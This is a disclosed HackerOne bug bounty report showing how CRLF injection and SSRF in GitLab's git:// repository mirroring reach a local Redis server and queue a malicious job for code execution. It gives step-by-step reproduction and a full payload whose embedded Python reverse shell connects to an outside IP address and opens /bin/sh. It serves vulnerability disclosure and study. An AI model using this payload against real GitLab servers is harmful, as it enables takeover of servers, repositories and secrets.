# CRLF injection & SSRF in git:// protocal lead to arbitrary code execution

## Report Details
- **Report ID**: 441090
- **URL**: https://hackerone.com/reports/441090
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-11-15T05:33:36.293Z
- **Disclosed**: 2020-11-23T16:07:44.869Z

## Reporter
- **Username**: chromium1337
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
**Summary:** 
The implementation of `git://` protocal in GitLab is vulnerable to CRLF injection and Server-Side Request Forgery. If the redis server is configured to listen on TCP socket (eg. port 6379), an attacker can abuse SSRF to manipulate redis server, injecting malicious payload into system_hook_push queue, which result in arbitrary code execution.

**Description:** 
This vulnerability is similar to @jobert 's https://hackerone.com/reports/299473 . GitLab patched the CRLF injection in HTTP header and introduced the UrlBlocker module to prevent HTTP requests going into intranet. But `git://` is not restricted to the UrlBlocker. 
This gif shows a request sent to 127.0.0.1:2333 with multiple CRLF injected:
{F375843}

## Steps To Reproduce:
  1. Follow [GitLab Docs](https://docs.gitlab.com/omnibus/settings/redis.html) to set up a redis server listening on `127.0.0.1:6379`
  2. Sign in and create a project, go to project Settings -> Repository -> Mirroring repositories
  3. Add a mirror repo, capture the POST request using BurpSuite or Fiddler or whatever you like, and modify the post param `project[remote_mirrors_attributes][0][url]` to:

```
git://127.0.0.1:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|/usr/bin/python3 -c \\\\\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"118.89.198.146\\\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\\\\\'\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
/bbbbb/ccccc
```

(Thanks to @jobert 's [payload](https://hackerone.com/reports/299473) again!)

  4. Make a POST request to `/{username}/{project name}/mirror/update_now?sync_remote=true` to trigger the mirror action
  5. Attacker will receive a reverse shell on 118.89.198.146 port 8000

{F375845}

## Impact

Same as https://hackerone.com/reports/299473:
> An attacker can execute arbitrary system commands on the server, which exposes access to all git repositories, database, and potentially other secrets that may be used to escalate this further.

## Attachments
- 2.gif
- 1.gif
